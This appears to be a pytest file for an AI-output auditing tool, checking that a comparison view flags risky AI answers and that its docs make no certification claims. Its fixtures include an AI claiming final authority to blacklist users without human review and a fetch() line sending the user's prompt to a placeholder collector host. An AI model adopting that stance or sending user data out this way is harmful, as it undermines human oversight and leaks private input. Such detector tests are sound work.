from pathlib import Path

from core.ai_integrity_mirror import (
    AI_INTEGRITY_COMPARISON_VERSION,
    audit_ai_integrity_batch,
    build_ai_integrity_comparison,
)

ROOT = Path(__file__).resolve().parents[1]


def read(path: str) -> str:
    return (ROOT / path).read_text(encoding="utf-8")


def test_patch_97_comparison_view_builds_artifact_level_rows():
    batch = audit_ai_integrity_batch(
        """
This is a bounded AI answer. Human review is required. Sources are incomplete and uncertainty remains.
---
This AI gives the final verdict and automatically blacklist users without appeal or human review.
---
fetch("https://collector.example.test/api/telemetry", {body: user_prompt})
""",
        artifact_kind="AI output",
    )
    comparison = build_ai_integrity_comparison(batch["results"])

    assert comparison["comparison_mode"] == "AI Integrity Comparison View"
    assert comparison["comparison_version"] == AI_INTEGRITY_COMPARISON_VERSION
    assert comparison["artifact_count"] == 3
    assert len(comparison["rows"]) == 3
    assert comparison["review_needed_count"] >= 2
    assert comparison["boundary_risk_counts"]["authority_claim_items"] >= 1
    assert comparison["boundary_risk_counts"]["privacy_signal_items"] >= 1
    assert comparison["rows_by_pressure"][0]["needs_review"] is True


def test_patch_97_comparison_preserves_non_certification_boundary():
    comparison = build_ai_integrity_comparison([])

    assert "artifact-level review support" in comparison["notice"]
    assert "not a live model benchmark" in comparison["notice"]
    assert "model-wide certification" in comparison["non_certification_note"]
    assert "rank vendors" in comparison["scope_note"]
    assert "certify systems" in comparison["scope_note"]


def test_patch_97_ui_docs_manifest_and_status_include_comparison_markers():
    combined = "\n".join(
        read(path)
        for path in [
            "core/ai_integrity_mirror.py",
            "app.py",
            "README.md",
            "docs/ai_integrity_mirror.md",
            "docs/ai_integrity_comparison_view.md",
            "PATCH_STATUS.md",
            "docs/progress_database.md",
            "PATCH_97_MANIFEST.txt",
            "PATCH_97_RECOVERY_NOTE.md",
        ]
    )

    for phrase in [
        "Patch 97",
        "AI Integrity Comparison View",
        "side-by-side",
        "artifact-level",
        "signal counts",
        "boundary-risk comparison",
        "review needed",
        "No analyzer scoring change",
        "No verdict-routing change",
        "No live model benchmarking",
        "No external calls",
        "not model-wide certification",
        "not a vendor ranking",
        "not a final truth claim",
    ]:
        assert phrase in combined


def test_patch_97_does_not_introduce_model_wide_or_authority_claims():
    patched_text = "\n".join(
        read(path)
        for path in [
            "core/ai_integrity_mirror.py",
            "app.py",
            "README.md",
            "docs/ai_integrity_mirror.md",
            "docs/ai_integrity_comparison_view.md",
            "PATCH_STATUS.md",
            "docs/progress_database.md",
            "PATCH_97_MANIFEST.txt",
            "PATCH_97_RECOVERY_NOTE.md",
        ]
    ).lower()

    forbidden_claims = [
        "certifies models",
        "certifies vendors",
        "guarantees model safety",
        "proves model safety",
        "absolute ranking",
        "final truth ranking",
        "approved by aletheia",
        "will call live models",
        "benchmarks live models",
    ]
    for phrase in forbidden_claims:
        assert phrase not in patched_text
